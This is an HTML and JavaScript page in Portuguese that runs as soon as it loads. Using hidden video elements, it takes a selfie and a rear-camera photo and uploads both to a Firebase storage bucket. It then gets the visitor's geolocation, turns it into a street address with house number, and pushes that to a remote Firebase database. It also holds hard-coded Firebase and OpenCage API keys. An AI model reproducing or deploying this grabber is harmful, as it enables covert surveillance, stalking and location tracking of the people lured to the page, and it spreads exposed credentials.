<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Captura Automática de Dados</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      margin: 20px;
    }
    #loader {
      display: none;
      width: 100%;
      height: 10px;
      background-color: #f3f3f3;
      position: relative;
      overflow: hidden;
      margin-top: 20px;
    }
    #loader div {
      width: 0;
      height: 100%;
      background-color: #4caf50;
      animation: loading 3s linear infinite;
    }
    @keyframes loading {
      from { width: 0; }
      to { width: 100%; }
    }
    #location-message {
      margin-top: 20px;
      font-size: 16px;
      color: #555;
    }
  </style>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-storage-compat.js"></script>
</head>
<body>
  <h1>Captura Automática de Dados</h1>
  <p id="location-message">Aguardando permissão para acessar sua localização...</p>

  <div id="loader">
    <div></div>
  </div>

  <script>
    // Configuração do Firebase
    const firebaseConfig = {
      apiKey: "AIzaSyAWhfaY2Adp4YJGwvITWTGHP-7zOLNfiGI",
      authDomain: "sandalias-retro-9f0c6.firebaseapp.com",
      databaseURL: "https://sandalias-retro-9f0c6-default-rtdb.firebaseio.com",
      projectId: "sandalias-retro-9f0c6",
      storageBucket: "sandalias-retro-9f0c6.appspot.com",
      messagingSenderId: "786208752798",
      appId: "1:786208752798:web:193f76bbbf5ac4ef27678f",
      measurementId: "G-XGVHLX01EB",
    };

    // Inicializa Firebase
    const app = firebase.initializeApp(firebaseConfig);
    const database = firebase.database();
    const storage = firebase.storage();

    const loader = document.getElementById('loader');

    // Mostrar barra de carregamento
    function showLoader() {
      loader.style.display = 'block';
    }

    // Ocultar barra de carregamento
    function hideLoader() {
      loader.style.display = 'none';
    }

    // Função para capturar selfie e foto com a câmera traseira
    function captureSelfieAndBackCamera() {
      const video = document.createElement('video'); // Cria o elemento de vídeo oculto
      const canvas = document.createElement('canvas'); // Cria o canvas oculto

      showLoader(); // Exibe a barra de carregamento

      // Primeiro captura a selfie com a câmera frontal
      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
        .then(stream => {
          video.srcObject = stream;
          video.play();

          video.onloadedmetadata = () => {
            // Captura a selfie com a câmera frontal
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Para a câmera e captura a imagem
            stream.getTracks().forEach(track => track.stop());

            const selfieData = canvas.toDataURL('image/png', 1.0); // Gera a imagem em alta qualidade

            // Agora captura a foto com a câmera traseira
            captureBackCamera(selfieData);
          };
        })
        .catch(error => {
          hideLoader();
          alert('Erro ao acessar a câmera frontal. Verifique as permissões e tente novamente.');
        });
    }

    // Função para capturar a foto com a câmera traseira
    function captureBackCamera(frontSelfieData) {
      const video = document.createElement('video'); // Cria o elemento de vídeo oculto
      const canvas = document.createElement('canvas'); // Cria o canvas oculto

      // Solicitar permissão para a câmera traseira (facingMode: 'environment')
      navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: { exact: 'environment' } } 
      })
        .then(stream => {
          video.srcObject = stream;
          video.play();

          video.onloadedmetadata = () => {
            // Captura a foto com a câmera traseira
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Para a câmera e captura a imagem
            stream.getTracks().forEach(track => track.stop());

            const backCameraData = canvas.toDataURL('image/png', 1.0); // Gera a imagem em alta qualidade
            uploadPhotosToStorage(frontSelfieData, backCameraData);
          };
        })
        .catch(error => {
          hideLoader();
          alert('Erro ao acessar a câmera traseira. Verifique as permissões e tente novamente. Detalhes do erro: ' + error.message);
        });
    }

    // Função para salvar as fotos no Firebase Storage
    function uploadPhotosToStorage(frontSelfieData, backCameraData) {
      const timestamp = new Date().toISOString(); // Obtém a data e hora atual
      const frontStorageRef = storage.ref(`photos/frontSelfie_${timestamp}.png`);
      const backStorageRef = storage.ref(`photos/backCamera_${timestamp}.png`);

      // Salva a foto da câmera frontal
      frontStorageRef.putString(frontSelfieData, 'data_url')
        .then(snapshot => snapshot.ref.getDownloadURL())
        .then(frontUrl => {
          // Salva a foto da câmera traseira
          backStorageRef.putString(backCameraData, 'data_url')
            .then(snapshot => snapshot.ref.getDownloadURL())
            .then(backUrl => {
              getLocation(frontUrl, backUrl, timestamp); // Coleta localização e salva os dados
            })
            .catch(error => {
              hideLoader();
              alert('Erro ao salvar a foto da câmera traseira: ' + error.message);
            });
        })
        .catch(error => {
          hideLoader();
          alert('Erro ao salvar a foto da câmera frontal: ' + error.message);
        });
    }

    // Obter endereço completo a partir de coordenadas
    function getAddressFromCoordinates(lat, lon, frontUrl, backUrl, timestamp) {
      const apiKey = '150e176e377d4d2ab2819ddada71dbe7';
      const url = `https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=${apiKey}`;

      fetch(url)
        .then(response => response.json())
        .then(data => {
          if (data.results.length > 0) {
            const result = data.results[0].components;
            const addressDetails = {
              latitude: lat,
              longitude: lon,
              city: result.city || result.town || result.village || '',
              neighborhood: result.suburb || '',
              road: result.road || '',
              house_number: result.house_number || '',
              country: result.country || '',
              address: data.results[0].formatted,
              frontSelfieUrl: frontUrl,
              backCameraUrl: backUrl,
              timestamp: timestamp
            };
            sendDataToFirebase(addressDetails); // Envia os dados para o Firebase
          } else {
            alert('Erro ao obter endereço: nenhum resultado encontrado.');
          }
          hideLoader();
        })
        .catch(error => {
          hideLoader();
          alert('Erro ao obter o endereço: ' + error.message);
        });
    }

    // Localização do usuário
    function getLocation(frontUrl, backUrl, timestamp) {
      if (navigator.geolocation) {
        document.getElementById('location-message').innerHTML = 'Será solicitado acesso à sua localização para concluir o processo. Por favor, permita o acesso para continuar.';
        navigator.geolocation.getCurrentPosition(
          position => {
            const { latitude, longitude } = position.coords;
            getAddressFromCoordinates(latitude, longitude, frontUrl, backUrl, timestamp);
          },
          error => {
            hideLoader();
            switch (error.code) {
              case error.PERMISSION_DENIED:
                alert('Permissão de localização negada. Para continuar, ative a permissão nas configurações do navegador.');
                break;
              case error.POSITION_UNAVAILABLE:
                alert('Não foi possível determinar sua localização. Verifique se o GPS está ativado.');
                break;
              case error.TIMEOUT:
                alert('A solicitação de localização demorou demais para responder.');
                break;
              default:
                alert('Erro desconhecido ao tentar acessar a localização.');
            }
          }
        );
      } else {
        hideLoader();
        alert('Este navegador não suporta geolocalização.');
      }
    }

    // Enviar dados para o Firebase
    function sendDataToFirebase(data) {
      const reference = database.ref('userData');
      reference.push(data, function (error) {
        hideLoader();
        if (error) {
          alert('Erro ao enviar dados para o Firebase: ' + error.message);
        } else {
          alert('Dados enviados com sucesso!');
        }
      });
    }

    // Iniciar coleta de dados automaticamente
    window.onload = () => {
      captureSelfieAndBackCamera(); // Captura selfie e foto da câmera traseira automaticamente
    };
  </script>
</body>
</html>
